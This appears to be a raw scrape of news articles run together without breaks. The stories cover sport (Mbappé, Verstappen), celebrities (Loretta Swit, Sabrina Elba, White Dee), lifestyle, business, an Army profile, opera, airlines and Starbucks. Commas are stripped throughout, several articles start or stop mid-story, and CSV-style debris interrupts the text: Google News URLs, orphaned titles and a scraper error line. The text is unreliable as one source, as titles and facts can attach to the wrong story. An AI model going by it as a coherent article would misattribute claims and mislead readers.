Suddenly here he was clean through on goal: the best player in the world the hometown icon who has come to symbolize P.S.G.’s ambition prowess excess and hubris his flashbulb moment at his fingertips. And then as Dortmund’s defiant back line trailed helplessly in his blistering wake Mbappé slipped.

No tackle no foul no intervention whatsoever. He just fell over. He would not have his goal. He would not be the hero.

The actress who played Major Margaret ""Hot Lips"" Houlihan on the hit series from 1972 to 1983 opened up about her deep connection with Farr who portrayed Corporal Maxwell Q. Klinger 41 years after the show's wrap.

""[Jamie] still makes me laugh and keeps me connected to that piece of my heart that brought so much joy to millions of viewers"" she said in a new interview with First for Women. The two friends still often participate in autograph signings throughout the country.

ON THIS DAY IN HISTORY FEB. 28 1983 'M*A*S*H' FINALE DRAWS RECORD TV AUDIENCE OF OVER 100 MILLION

Reflecting on the show's major success Swit credits it to the cast's on- and off-screen chemistry.

""Everyone liked coming to work"" she said. ""The camaraderie was unlike anything I ever experienced because we were all connected deeply. The chemistry was real and the energy everyone brought to the set was off the charts which was a part of the reason the show developed a huge/loyal fan base.""

Laughter was also important for the show.

""Laughter and humor were our defense against standing in blood and working on bodies that were young enough to be in school"" she said. ""You needed the funniest people in the world to make this believable and this cast exceeded that and more.""

""M*A*S*H"" which followed a team of doctors stationed in Korea during the Korean War won 14 Emmy Awards throughout its 11-season run.

""Initially when we started out everyone wondered how we were going to be able to pull off a comedy about the war but we did"" Swit said.

In 2023 Swit opened up to Fox News Digital about how her character's nickname ""Hot Lips"" has since stuck with her all these years.

""I understand nicknames come with great love and admiration for a character"" the star explained. ""But it was an insult as far as I was concerned. She wasn’t just a piece of anatomy. She was a major in the United States Army and she should not be disrespected.""

""This was a woman who had rank who worked hard and wanted to be good at her job"" Swit shared. ""She was an inspiration. I was proud of her. I was proud to represent all the service women out there. I wanted to make a change.""

Swit said she was also proud of being part of the celebrated show  so much so that she was worried the nickname would overshadow the heroic efforts of real-life service women belittling them to a punchline.

""I didn’t want those women to be disrespected"" the actress reflected. ""Obviously people are going to see it differently. Margaret did not see [the nickname] as a compliment. She saw it as disrespect. So yes I would say it was never a comfort zone.""

These days Swit continues her activism through her charity SwitHeart Animal Alliance  and creating art.

In 2017 she published ""SwitHeart: The Watercolor Artistry & Animal Activism of Loretta Swit"" a book made up of 65 watercolor paintings and 22 photographs that also include personal stories.

Growing up like many teenagers UN Goodwill Ambassador and entrepreneur Sabrina Elba suffered from acne and post-inflammatory skin hyperpigmentation. With a condition that causes dark spots where active red acne pimples once were she tried acids and many products from Sephora to clear her face of breakouts only for it to do more harm than good.

“I started to really feel the effects of that as I was growing up because the skin barrier damage it was getting worse” says Elba the founder of new skin care brand S’Able Labs. “It wasn’t getting better.”

Her mother however relied on the traditions of their Somali heritage to curate a natural skincare routine that always kept her skin breakout-free.

“I grew up watching [my mom] make [her] own products and face masks and DIY everything in the kitchen” she says. “I think that was probably I mean for sure the influence that led me to adding these African botanicals into the [S’Able Labs] skincare range.”

The potency of those natural ingredients passed down from generation to generation inspired the model to start her own African skincare line with husband and fellow African Idris Elba.

“The fact that we come from East Africa and [Idris] is from West Africa and this sort of continental theme African theme this Pan-African theme … what I realized and sort of become addicted to is these stories and heritage pieces around these ingredients and these customs” says Sabrina Elba.

Their African skincare or A-Beauty line is formulated with antioxidants — including turmeric okra quasil and black seed — to target skincare concerns on a cellular level like hyperpigmentation a common condition that people with melanin experience.

Among S’Able Labs’ newest products is their Okra Face Serum which is made with a trademarked bio-available retinol called SymRenew; African Resurrection Plant an antioxidant; the brand’s own Hyperprevent technology to lessen hyperpigmentation; and botanical peptides derived from okra which the company calls “nature’s Botox.”

“This has integrity behind it and an efficacy there” Sabrina Elba says. “And I want to show people that African ingredients are so powerful.”

Brings Holiday Spirit to The Ritz-Carlton Cancun With a Glamorous Tree and Pop-up Shopping Suite,"As we all know no Christmas tree is fully trimmed without some decorations bought at Tiffany's.

And this holiday season Tiffany & Co. has taken over the lobby of The Ritz-Carlton Cancun bringing the spirit of the New York jeweler to the bright sands of the luxury Mexican resort.

Guests will be awed by the glamorous tree in the hotel's lobby complete with baubles exclusive to Tiffany & Co. that bring ""the extravagant Christmas spirit of New York City to the warm and sandy beaches of Cancun"" the iconic brand shared with Travel + Leisure.

Courtesy of Tiffany & Co.

The Christmas tree is elevated on a Tiffany blue pedestal and situated directly beneath a decadent chandelier. More than 800 spheres and 300 glass ornaments are hung so it looks like glamour itself cascades down the tree's branches. The layout is inspired by Jean Schlumberger a former designer for the jewelry brand who created some of Tiffany's most memorable baubles.

The tree will be in place until Jan. 6.

But the glamour doesn't end in the lobby. The hotel has also opened a Tiffany-themed suite for the season where guests can view ""exclusively selected jewelry"" a hotel spokesperson told T+L. An expert from the jewelry brand will be on-site to help guests select any last-minute holiday treats with a personalized shopping experience.

And if the suite is not enough guests can visit the nearby La Isla Shopping Mall home to many luxury brands including Tiffany & Co.

Tiffany & Co. is making appearances in other unexpected places this holiday season as well. The jeweler has also opened a fantastical downtown NYC pop-up shop complete with interactive exhibits and even tarot card readings.

The property powered by its own solar farm includes a 12000-square-foot four-bedroom home with a gym greenhouse five fireplaces and a 22-foot ceiling in the great room according to the Wall Street Journal. It also has a campground and two barns a corral and stables for horses as well as riding trails.

Retired Seagate Technology executive Charles Pope and his wife former nurse Gloria Pope bought a 35-acre parcel in 2002 and added another four pieces over the years. While they live there now they initially bought it only for family get-togethers.

“You couldn’t reserve anything big enough” Charles Pope said. The gatherings held every two years have since broken up into smaller reunions.

They commissioned the home themselves at a cost of about $10 million. Pope said the solar farm provides almost all the electricity needed for the house and facilities.

It’s in the unincorporated community of Hesperus at the southwest corner of Colorado about an hour and a half from the Four Corners border with Utah Arizona and New Mexico and two hours from Telluride and its surrounding mountain resorts. Tom Cruise earlier this year sold his 320-acre mountain retreat in Telluride for close to his asking price of $39.5 million.

Colorado is among Western states that have attracted buyers from coastal metropolitan areas since the pandemic. That’s helped drive up prices in many parts of the state. including Hesperus where they rose 15 percent in the last year or so according to Zillow data reported by the Denver Post.

Kohut’s “What We Leave Behind.’’ Hapi Art

Sage is all the rage at least for the year ahead. That is according to paint brands and their teams of color experts who are speculating that the chromatic powers of this precise shade of green — which calms nurtures and generates a peaceful sense of place — will continue to resonate with consumers in their living spaces.

In times past annual color selections from competing paint companies often meant consumers were presented with a diverse and sometimes perplexing mix of colors to inform their design decisions.

About one year ago Pantone Color Institute a global color authority and provider of professional color language standards and digital solutions used by industries across the world selected two colors for 2021: a lively yellow and a mid-tone gray to reflect a message of resilience and hope amid the COVID-19 crisis. Other hues that were proposed by brands for the masses last year included bronze teal and terra cotta — to name a few.

The year before that was brimming with an impressive array of blues and the year prior to that saw cameos by a strong energetic shade of red and various versions of black. And no one will ever forget the conspicuous purple with very rock ’n’ roll vibes that was Pantone’s “it’’ color for 2018. Now Pantone is promoting Very Peri a dynamic periwinkle blue newly created for the year ahead.

Green hasn’t been completely absent from color announcements in the recent past yet the nearly unified nomination of sage-centric shades for 2022 undeniably speaks to cozying up the home while setting intentions for positive nurturing things.

“October Mist’’ by Benjamin Moore evokes “the silver-green stem of a flower’’ according to a brand statement announcing the paint brand’s “it’’ color for next year.

It’s a new neutral said Cindy Rinfret a designer from Greenwich Conn. who calls the color tranquil and understatedly compelling. “It’s serene and earthy but also flexible.’’

Yet its power to draw attention might be in its ability to couple with other colors. “It would come alive in an unexpected way when combined with turquoise speaking to a summery or Southern aesthetic’’ Rinfret said. “I also love the idea of it being paired with russet and other spice colors or with any blonde neutral for a spa-like feel.’’

Paint brand PPG chose “Olive Sprig’’ a medium sage green and Behr paint brand opted for a similar light sage hue named “Breezeway.’’

Chicago artist Kristi Kohut finds sage-oriented wall colors soothing and versatile and a fitting backdrop for colorful artwork. “Don’t worry about making the art and walls match perfectly’’ said Kohut who recommended pieces with yellow or pinks from a soft blush to a vibrant magenta. Alternatively artwork featuring shapes in dusty blues like a soft violet or sky blue invites a cooler unconventional palette on top of sage green walls.

“Evergreen Fog’’ a sage green with a tinge of gray is the color of the year from Sherwin-Williams. According to a brand statement the shade represents revitalization and growth and is ushering in a “new era of nostalgic mid-tones.’’

“It is warm enough to evoke a feeling of harmony and comfort yet neutral enough to work well as a backdrop for many design styles’’ said Connecticut-based designer Georgia Zikas noting that the color succeeds in a biophilic way by bringing the feeling of the outdoors in.

“I think this would work beautifully with many other warm neutrals such as ivories caramels or ecru but also just as beautifully with contrasting shades of lilac navy or espresso’’ Zikas said.

Dunn-Edwards endorsed “Art and Craft’’ as its 2022 color of the year citing it as a new take on a historic hue that embodies nature sophistication and health and wellness. Art and Craft is also an earthy neutral described by the brand as a “plush tactile brown that is rugged and strong.’’

Rozit Arditi a designer from New York said this particular shade would work well in a cozy reading room library or family room. “Design is gravitating more to earth tones and using Mother Nature as our inspiration’’ said Arditi adding that this trend of embracing earthy colors is a reaction to the world shifting toward sustainability. Arditi recommended pairing it with other neutral tones or contrasting it with deep navy blues. Sage green she said could work well too.

Online paint company Backdrop doesn’t believe in designating a singular color for the year ahead. Indeed it recently launched three distinct new colors into its catalog including “Earthly Delights’’ a shade of light peach; “Gin Blossoms’’ a warm lilac; and a slate blue-gray called “Silver Lake Dad.’’

For those looking beyond paint another option is to introduce the favored sage-like hues via furniture textiles and accessories. Tiles from Heath Ceramics in Meadow Green can enrich the look of floors and backsplashes and level up the look of bathrooms. Patterned wallpaper like the Warri Palms print in Dried Basil from Chasing Paper takes the sage vibe to an entirely funky and fun level. It’s just one pattern from the company’s latest collection created in collaboration with New York-based designer and artist Shadé Akanbi.

The simplest method these days for evaluating how a fresh coat of color may look in living spaces doesn’t even require picking up a paintbrush. Peel-and-stick paint swatches like those from Samplize Backdrop and Clare paint which offers a Dream Greens swatch kit with seven shades of nature-inspired hues for $14 can be easily moved between walls and rooms so you can see where the “it’’ colors or any color that speaks to you truly flourish.

An old picture of Michael Schumacher 52 and Max Verstappen 24 has made the rounds on social media as the young driver has won the Abu Dhabi Grand Prix and his first Formula One World Championship.

Red Bull's Verstappen grabbed his first F1 world title in disputed circumstances by beating Mercedes' Lewis Hamilton in an exhilarating finale to the season that the two drivers entered level on points. Hamilton was on course for his eighth world title with six laps remaining as he was cruising 11 seconds ahead of Verstappen.

""Thanks kid.""



Throwback to when Michael Schumacher met a young fan called Max Verstappen. pic.twitter.com/Wkk5M5hF8h — ESPN F1 (@ESPNF1) December 12 2021

Then however the dramatic race made Verstappen who in 2015 aged 17 became the youngest driver in the history of the sport the first Dutchman to win the F1 world championship. Beating a confident seven-time champion Hamilton is celebrated by crowds of F1 fans as an impressive achievement – but not without controversy. Throughout the season accusations between teams grew and tensions heightened. The Grand Prix has ended on such lines.

Hamilton had led the race from the first corner to the penultimate lap. Then after a late safety car Red Bull pitted Verstappen and put him on newer tyres while Hamilton stayed on old ones. So the race was restarted and the 24-year-old pushed past Hamilton to victory. Mercedes furious launched two protests – one on lapped cars being allowed and one over Verstappen overtaking a safety car.

The 24-year-old is the first Dutchman to win the F1 world championship

The first protest read: ""Protest by Mercedes-AMG PETRONAS Formula One Team against Car 33 alleged breach of Article 48.8 of the 2021 FIA Formula One Sporting Regulations."" The second read: ""Protest by Mercedes-AMG Petronas F1 Team against the classification established at the end of the Competition alleged breach of Article 48.12 of the 2021 FIA Formula One Sporting Regulations."" Sky Sports F1 expert Ted Kravitz has suggested Verstappen could be slapped with a five-second penalty if he is found guilty of passing Hamilton before the line at the restart on the final lap. Hamilton less than five seconds behind Verstappen would own the title if such a penalty was applied. DON'T MISS

Meanwhile Martin Brundle who thinks Mercedes may push for the final lap to be cancelled suggested: ""Mercedes will obviously say they want a lap count back I'm not sure where the regulation or the precedent would be for that. ""The purpose of letting lap cars out of the way... it was brought in to stop them interfering in the main race at any phrase of the Grand Prix. ""Was it done fairly? I believe the lapped teams were pushing for information Michael Masi didn't want to let them through while there was a breakdown truck and marshals on the track."" As Hamilton was leading the race he will be crowned champion if the final lap is cancelled. The picture of Verstappen and Schumacher reminds of a comparison between the two racers made by a former F1 driver before Sunday's finale. Hamilton’s one-time grid colleague Anthony Davidson said Verstappen can’t afford to do anything which would see him become the sport's villain.

Benefits Street star White Dee’s daughter Caitlin is all grown up in rare snap

Six years after making an appearance on Channel 4's controversial Benefits Street White Dee's daughter Caitlin has made an appearance in a rare social media snap.

Caitlin appeared on the show when she was just 16 back in 2014 and has now blossomed into an adult woman.

Her proud mum White Dee - real name Deidre Kelly - took to Instagram to share a beaming selfie in a rare snap.

The picture showed Deidre Caitlin and Deidre's niece Nicole Hudlin dressed up for the Balls to Cancer's 10th Christmas ball.

She captioned the snap: ""Me and my beautiful girls at @ballstocancer 10th xmas ball x so proud of you my amazing daughter @caitlin.kelly97 and my fabulous niece @lifeislikeaboxofchocolates_x [kissing emojis]"".

The account tagged as Caitlin does not lead to an active Instagram account and the young woman is known for keeping her online presence private.

It is not known what she does for a living but she has spoken out in the past about her desire to train as a police officer.

Speaking to MailOnline Caitlin said: ""I want to become a police officer because the police department has so much to offer and I could never get bored of it.

""I want to make sure I work for a living and not have to depend on people because one day they might not be there for me.""

Image: Channel 4) Channel 4)

Caitlin said that she was proud of her mother but would never claim benefits as her mother famously has.

Dee was dubbed as the 'mother of the street' in the controversial Benefits Street where she openly admitted to claiming benefits.

It was reported by the Daily Mail that Dee was claiming £20000 in government benefits as she was ""too depressed"" to work.

This came under fire as she was pictured sunbathing in Magaluf and indulging in drinks on the party island during the time of her depression.

Caitlin spoke out in her mother's defence following the backlash according to the Daily Mail she said that her mother wanted to work but suffered from an incapacitating depression.

She said: ""I'm not ashamed of my mum because she did what she had to do to make sure me and my brother are happy.""

Dee went on to enter Celebrity Big Brother after shooting to fame and went on to make a number of TV appearances and her own fitness DVD - BeneFIT.

In an interview with Closer earlier this year Dee expressed an interest in starring on Love Island.

The 50-year-old said: ""I'm a curvy sexy older woman and they say they want diversity on the show - what better way than with me?

""I'm a real hit with younger men - they're always sliding into my DMs! So get me in the villa to spice things up."""

Irving-based energy giant ExxonMobil recently announced it acquired green energy support company Materia for an undisclosed amount.

Materia was founded in 1999 out of the laboratories at the California Institute of Technology by Professor Robert Grubbs. In 2005 Grubbs was awarded the Nobel Prize in chemistry for his development of new chemical bonding processes. The company now focuses on developing polymer technology with commercial applications. Materia is based in Pasadena California and has a manufacturing facility in Huntsville.

According to a prepared statement by Exxon both companies have been working together since 2017 to develop new hydrocarbon-based materials to strengthen their renewable energy infrastructure capabilities. New developments with Materia can improve green infrastructure such as wind turbines by making materials lighter and stronger.

“We are reimagining how new hydrocarbon-based materials can form the building blocks to help multiple industries achieve a more sustainable future” said Karen McKee president of ExxonMobil Chemical Company a subsidiary of ExxonMobil. “This acquisition ties together Materia’s Nobel Prize-winning technology with ExxonMobil’s complementary proprietary technology and world-class manufacturing capabilities to bring this exciting new class of structural materials to commercial scale.”

Exxon’s partnership and later acquisition of Materia further emphasize Exxon’s commitment to reduce greenhouse gas emissions by 15 to 20 percent by 2025. Part of Exxon’s plan to reduce greenhouse gasses also includes investment in new technologies and the adoption of efficient manufacturing practices.

“The combination of Materia’s innovative culture dedicated employees and cutting-edge technology with ExxonMobil’s expertise and scale in bringing new technology to market will open up an exciting new chapter for Materia” Grubbs said in a prepared statement. “ExxonMobil’s acquisition significantly expands the growth opportunities for this unique technology.”",https://news.google.com/articles/CBMiOWh0dHBzOi8vd3d3LmR2aWRzaHViLm5ldC9uZXdzLzQwOTIyNy9zb3V0aGVybi1ob3NwaXRhbGl0edIBAA?hl=en-US&gl=US&ceid=US%3Aen,News - Southern Hospitality,"For 24-year-old Cpl. Lexie Etheridge a human resources specialist assigned to 4th Battalion 9th Infantry Regiment 1st Stryker Brigade Combat Team 4th Infantry Division the path of serving others was one she had wanted to follow from a young age.



Having her first child at the age of 18 Etheridge soon realized the path she was destined to travel wouldn’t be walked alone but the reward at the end would be worth every step along the way.



“I’m somewhat sort of an anomaly where I’m from” said Etheridge gleefully with a thick southern accent. “It’s rare that you see women back in my hometown volunteering to join the Army let alone a single mother with two kids.”



The Union City Tennessee native knows she’s always had a passion for helping others which she claims stems from her supportive family and upbringing.



“Southern hospitality is certainly a real thing not just an expression” said Etheridge jokingly. “I owe a lot to my parents and how they raised me. They instilled in me at a very young age an empathetic and caring nature that I carry with me and try to do the same with my children.”



With ambitions to pursue a career in nursing Etheridge was in a vocational student organization for her duration of high school called the



Health Occupation Students of America (HOSA). HOSA’s mission is to train and educate future healthcare professionals to become leaders in the global health community.



“It was a very empowering experience” Etheridge said. “I was taught a lot of tools and skills both related and unrelated to healthcare that I still use to this day. I will always be grateful for the experience.”



Although equipped with the competencies to begin a profession of helping others Etheridge’s pregnancy put her future potential career in the healthcare sector on hold.



“My number one priority became my son at the time” said Etheridge. “I was young and so heavily invested in trying to be the best mother that I practically disregarded anything related to professional development.”



Despite doing various volunteer work in her community Etheridge felt an overwhelming sense of stagnation.



She says it was her two children five-year-old Levi and three-year-old Lilah who kept her grounded and motivated to find ways to push herself and others.



“It wasn’t easy being a mother at 18 but I never needed or asked for sympathy” she said. “I understood the position I was in so instead of vicariously living through all of my friends’ young adult lives my main focus was to raise my children help them grow and help myself grow in the process.”



Etheridge says as beneficial as the growth process was it came with its own set of trials and tribulations.



“I was a stay-at-home mother for almost four years before I volunteered to join” she said. “There was this empty void I couldn’t seem to fill. Don’t get me wrong nothing brings me more joy and fulfillment than raising my children but I was still missing something. Something intangible.”



After picking up a waitressing job for a year Etheridge says her patience grew thin and the monotony of her life was making her lose track of who she was and what she was set out to accomplish.



“I was done limiting myself to the confines of this restaurant and hometown” Etheridge said. “I knew I wanted to help change lives and leave an impact. It was time for me to become a better role-model for my children. The Army offered me opportunities no other organization could and I went after it. I knew I could bake all day and still be a great role-model but there is a level of sacrifice that is incomparable to Soldiers’ willingness to risk their lives for the safety and protection of their nation



and its citizens.”

Those who’ve met Etheridge during her two years in the Army thus far can best describe her as a motherly addition to their unit.



“We used to call her ‘Momma E’” said Staff Sgt. Malik Carter a human resources specialist assigned to Headquarters and Headquarters Company 1st SBCT 4th Inf. Div.. “Cpl. Etheridge epitomizes our military occupational specialty. Her natural inclination to help others in our shop was a direct translation of who she is as a person. She goes above and beyond the expectations set out for her and continues to strive for more.”



She has already twice accomplished the “Manchu Mile” hosted by the 4th Bn. 9th Inf. Reg.



Soldiers carry a 35-pound ruck and their rifle while completing a 25-mile commemorative march honoring Soldiers who fought the Chinese Boxer Rebellion by marching over 85 miles to the Battle of Tientsin in 1900.



“Take it from me they don’t get any easier” said a laughing Etheridge. “Enduring all 25 miles with your teammates and motivating one another is the deciding factor in successfully completing the march. Between the camaraderie combined with the history behind the event you naturally find the strength to finish it.”



Etheridge also graduated from the Basic Leaders Course 7th in her class out of a total of 242 Soldiers setting the bar high for her peers and subordinates.



“The sky’s the limit for me now” said Etheridge. “I’m fortunate enough to have given myself the opportunities when I did to be where I am today. I’m eager to continue my journey on helping others because that’s just who I am as a person.”



Now assigned to Task Force Manchu 1st SBCT at Erbil Air Base Iraq Etheridge says she has no plans of slowing down.



“I wonder about my journey and how much I’ve grown” said Etheridge. “I begin to think of the reward waiting at my destination for all the hard work I’ve put in but I know I’m far from it. The reward may lead to another path and that may very well lead to another person in need making this journey a never-ending reward in itself.”

Special to The Dispatch

Twenty-two months have passed since Opera Columbus last performed in its longtime home of the Southern Theatre.

The company has stayed visible since then — first with virtual presentations then with performances offered in two nontraditional venues COSI and 400 West Rich.

Under new General Director and CEO Julia Noulin-Merat who joined the company earlier this year Opera Columbus plans to keep on singing outside the concert hall: Next spring in conjunction with the company’s 40th anniversary “40 Days of Opera” will unfold with performances throughout Greater Columbus.

But for now it’s high time for the company to come home.

Need a break? Play the USA TODAY Daily Crossword Puzzle.

On Dec. 18-19 Opera Columbus will perform Giacomo Puccini’s iconic 1900 opera “Tosca” in the Southern its first performances in the theatre since “The Barber of Seville” in mid-February 2020.

“To actually be able to be coming back in full force in our home I think is incredibly powerful” Noulin-Merat said. “It really feels like all the stars aligned.”

By design “Tosca” was chosen to acknowledge the company’s history: Puccini’s opera was the first show Opera Columbus performed at the start of its inaugural season in 1981.

“It’s really our valentine to our origins” said Noulin-Merat adding that the opera’s grand scale made it an enticing choice for this comeback performance. “We are innovators we do things with a twist but at the same time we also do the warhorses extremely well” she said.

The plot unfolding in Rome in the 19th century revolves around an opera diva named Tosca (played by soprano Michelle Johnson) who becomes mired in a standoff between her lover Cavaradossi (tenor Adam Diegel) and the police chief Scarpia (baritone Brian Major). The show recommended for attendees age 13 and older will be sung in Italian with English-language subtitles.

But the storyline on its own isn’t enough to draw in audiences out of the opera-going habit. To attract attendees Noulin-Merat decided to go for big and bold staging.

“I don’t think it’s acceptable anymore to just tell patrons ‘Come be quiet for two hours and then come home’” Noulin-Merat said. “They want more; they want food for the soul.”

On the upper level of an elaborate two-tiered set designed by Noulin-Merat 27 musicians from the ProMusica Chamber Orchestra will play Puccini’s score. Conductor Tiffany Chang will lead the orchestra.

“ProMusica is actually on the stage with us but they’re 10 feet in the air” Noulin-Merat said. Although ProMusica has teamed with Opera Columbus in the past they have generally performed in the orchestra pit — too small to accommodate that number of players.

“Our musicians love playing opera” said ProMusica CEO Janet Chen who praises the partnership between the organizations.

“We have grown in how to listen to each other what to expect and really how to work together to make the performance a success” Chen said.

Adding to the sonic power of the show will be recordings of actual church bells in Rome.

Visual appeal will come courtesy of costumes designed by Neil Fortin which will take a cue from the 19th-century-set Netflix series “Bridgerton.”

“We’re having these period silhouettes but they’ll still feel very fresh and modern” Noulin-Merat said.

Of course most dramatically satisfying of all will be the singing of a cast led by Johnson who previously teamed with Opera Columbus and the Columbus Symphony for a production of “Aida” in 2018 and will be performing the title role of Tosca for the first time.

“It’s definitely a major milestone; it’s one of my lifetime goals as a soprano” said Johnson who resides in Philadelphia. “I don’t shy away from challenges and she is a challenge.”

Among the biggest challenges Johnson said is balancing her acting with the vocal demands of the part — without giving short shrift to either.

“I came to opera more as an actor first and then singing” she said. “I have to really really try to tame my instincts to go full force. I have to pace myself.”

And adding to the emotions on the stage: In real life Johnson is married to the performer playing Scarpia Brian Major.

“We don’t get to work a lot together” Johnson said. “It adds a little extra spark.”

The Association of Flight Attendants (AFA-CWA) feared the accessories made their members look unprofessional but has now relented and embraced the cheer of the holiday season.

Sadly Christmas-themed jumpers are still not permitted although this has more to do with the fact that flight attendants must remain easily identifiable as a member of airline crew and a Christmas jumper is a step too far for many aviation regulators.

Both Alaska Airlines and Virgin Atlantic have managed to get around the ban on Christmas jumpers by designing their own and issuing them to crew as an item of uniform. United Airlines unfortunately has no plans to design its own Christmas jumper.

In previous years flight attendants at United Airlines were told to wear “conservative” festive accessories but this rule has now been relaxed as long as the adornment remain “professional” looking.

In years gone by conservative meant no flashing lights glitter or slogans.

But United has now given the green light to “colorful” and even light-up accessories so long as general appearance rules are maintained. A colorful festive earring is therefore okay so long as it’s no longer than the prescribed 1-inch maximum length of uniform approved earrings.

Other festive-themed accessories that have been okay-d include socks scarves Christmas pins and head accessories.

In 2019 the Association of Flight Attendants attempted to ban light-up necklaces and Santa hats even when airlines like Emirates were encouraging crew to wear Reindeer antlers. This year the ban has been dropped for United’s flight attendants.",https://news.google.com/articles/CBMiM2h0dHBzOi8vc2ltcGxlZmx5aW5nLmNvbS9rYW5zYXMtY2l0eS1kZWx0YS1za3ljbHViL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,New Kansas City Terminal Set To Receive A Delta Sky Club,"ERROR: Article `download()` failed with ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response')) on URL https://news.google.com/articles/CBMiM2h0dHBzOi8vc2ltcGxlZmx5aW5nLmNvbS9rYW5zYXMtY2l0eS1kZWx0YS1za3ljbHViL9IBAA?hl=en-US&gl=US&ceid=US%3Aen",https://news.google.com/articles/CBMiLmh0dHBzOi8vdGhlcG9pbnRzZ3V5LmNvbS9kZWFscy9wb3J0bGFuZC1tYWluZS_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Deal Alert: Round-trip flights from US cities to Maine under $200,"Update: Some offers mentioned below are no longer available.

Starbucks baristas say they were puzzled by orders for iceless Frappuccinos and waterless Americanos.

They said customers could order them on the Starbucks mobile app until it was updated recently.

Customers could sometimes get mad if their drinks didn't turn out as expected some baristas said.

Starbucks baristas have expressed puzzlement at receiving orders for iceless Frappuccinos and waterless Americanos via the coffee-chain's app.

Current and former baristas told Insider that unusual mobile orders — the beverage equivalent to ordering a cheeseburger with no burger — could cause headaches and lead to customers getting angry.

The baristas said weird mobile orders posed problems because they couldn't ask customers questions about what they actually wanted before they arrived at the store to collect their drinks. In some cases they had to offer customers refunds or alternative drinks said the baristas who spoke on the condition of anonymity to protect their employment.

A Starbucks barista in Minneapolis said some mobile orders couldn't be made until the customer got to the store ""because we have no idea what they're asking for.""

The latest version of Starbucks' US iPhone app which is updated frequently didn't as of Friday include some of the customization options that baristas described.

A Starbucks spokesperson said: ""Customizing beverages at Starbucks and our baristas' expertise in helping customers find and craft the right beverage has and always will be at the heart of the Starbucks experience.""

They added: ""There are many ways for customers to modify their favorite beverage and most customizations are reasonable requests from customers; 75% of customized beverages at Starbucks have fewer than three unique modifications.""

One Frappuccino hold the ice

Starbucks staff said customers had ordered iceless Frappuccinos on the Starbucks app.

""That always makes me chuckle"" a shift supervisor in Tennessee said noting that ice is an ""integral"" part of the drink. ""The Starbucks app shouldn't let you do that.""

Baristas said that the ""no ice"" option was once available on the company's US app. This wasn't an option as of Friday. Customers could still order iceless Frappuccinos on the UK app however Insider found.

A former barista in British Columbia Canada who spoke on the condition of anonymity because she may return to work at Starbucks said her store used to get at least three orders a day for iceless Frappuccinos.

Opinions were divided among baristas as to why customers were opting for Frappuccinos without ice.







""They just didn't know what they were ordering"" Kelly Preston a former barista in Georgia said.

The UK app lets customers select how much ice they want in their Frappuccino. ""No ice"" is an option. Grace Dean/Insider

Gary Ladewig a former shift supervisor in Illinois said he thought some customers had selected the no-ice option by accident. Madeline Babin a former barista in Louisiana said she thought they were accidentally ordered by children.

Ladewig and the former British Columbia barista said some customers told them they bought iceless Frappuccinos to drink at home where they added ice themselves.

One Americano hold the water

Six former Starbucks employees in the US said they'd received mobile orders for Americanos with no water. A former barista in Canada and a former shift supervisor in the UK also said they'd been asked to make waterless Americanos.

The baristas said the ""no water"" option was once available on the company's US app but isn't any longer. Customers can still order waterless Americanos on the UK app Insider found as well as iced teas with no ice and no water.

The UK app lets customers choose how much water they want in their Americano. ""No water"" is an option. Grace Dean/Insider

Preston said she thought customers who ordered waterless Americanos wanted lattes but didn't want to pay full price and would add milk themselves from the self-serve station.

""Customers often don't actually understand what a drink is made out of and so they might select 'Americano with no water' and then get angry when you hand them a cup of just espresso"" Nicholas Anderson a former barista in Atlanta said. ""So it's always better to err on the side of not making the drink.""

The Starbucks UK app also lets customers order iced tea without ice or water. Grace Dean/Insider

Excessive modifications and cup sizes that don't match the drinks

Some baristas said customers had placed mobile orders for hot drinks with cold foam.

""That's just funny"" the Tennessee shift supervisor said.

Starbucks uses cold foam for cold brew coffee. When cold foam is used on hot drinks it melts quickly and customers ""get in a little fit with me about it"" the Tennessee shift supervisor said.

The Starbucks US app still allows customers to order drinks with cup sizes that don't reflect the size of their drink.

Babin said a lot of customers ordered drinks in bigger cups which she thought was so they could add extra milk or whipped cream but some ordered drinks in smaller cups which she didn't understand. In these cases she would serve the drink in a cup that matched the size of the drink but would also give the customer a cup in the size they requested she said.

Some baristas said that customers had asked for so many modifications they struggled to fit the drinks into one cup. One barista called drinks like these ""kitchen soup Frappuccinos.""

The Tennessee shift supervisor said one customer ordered a Frappuccino with around 10 shots of espresso which just melted the ice.

A shift supervisor in Maryland said some customers added modifications ""just because they're there.""

""People can make drink combinations that not only aren't intuitive but also just don't make sense"" they added.

Baristas said that some in-store customers had weird requests too like asking for cake pops brownies and even egg bites to be blended into drinks.

CASA Lake County has again launched its annual ""Giving Tree"" program that provides new clothing and holiday gifts to Lake County foster children. Twenty-four local Starbucks stores are participating this year and customers are urged to stop by through December to participate.

CASA Lake County provides each Starbucks with a small holiday evergreen decorated with colorful tags. Each tag is marked with a specific gift item needed or requested by a child. The items range from warm winter coats and clothing to baby blankets toys books gift cards and more.

Customers pick up a tag shop any place they choose and return the purchased item to a collection site at Starbucks. CASA Lake County volunteers then pick up the items and deliver them to the foster children.

Starbucks participating in the program include stores in Buffalo Grove Highland Park Highwood Lake Bluff Vernon Hills Grayslake Mundelein Libertyville Waukegan Gurnee Antioch Round Lake Long Grove Lake Zurich Deer Park Volo and Hainesville.

This is the 10th year that Starbucks has partnered with CASA Lake County on the ""Giving Tree"" program.

""Thanks to the generosity of Starbucks and their customers this program has grown dramatically in recent years"" said Terri Zenner Greenberg CASA Lake County executive director.

""So many foster families depend on this program to provide holiday gifts for children in their care. We are incredibly grateful to Starbucks and their customers for enabling us to continue this tradition.""

CASA Lake County is a local nonprofit organization that advocates for children who have been abused or neglected and are party to cases active in the Lake County juvenile court system. The majority of the children are in foster care.

CASA is supported by nearly 300 volunteers who are trained by the organization and certified by the court to advocate on behalf of the children.

CASA Lake County needs additional volunteers to serve an increasing population of foster children requiring support and court advocacy.

""We are seeking volunteers of all backgrounds"" Zenner Greenberg said. ""But in particular we encourage volunteers who speak Spanish as well as male volunteers to join us and help us best serve our diverse community.

If you are interested in volunteering contact Lori Petersen at lpetersen@casalakecounty.com or request to volunteer at www.casalakecounty.com.

Construction has started on two new businesses — a Starbucks drive-through and a 7-Eleven convenience store and gas station — at long-vacant plots stretching south on South Western Avenue from South Archer Avenue in Chicago’s McKinley Park neighborhood.

The City of Chicago issued initial building permits for the two projects on December 8 2021 and demolition of the existing buildings including a former Walgreens pharmacy started quickly afterward.

As previously reported here in the McKinley Park News developers have planned a Starbucks drive-through restaurant and a 7-Eleven convenience store and gas station for the property.

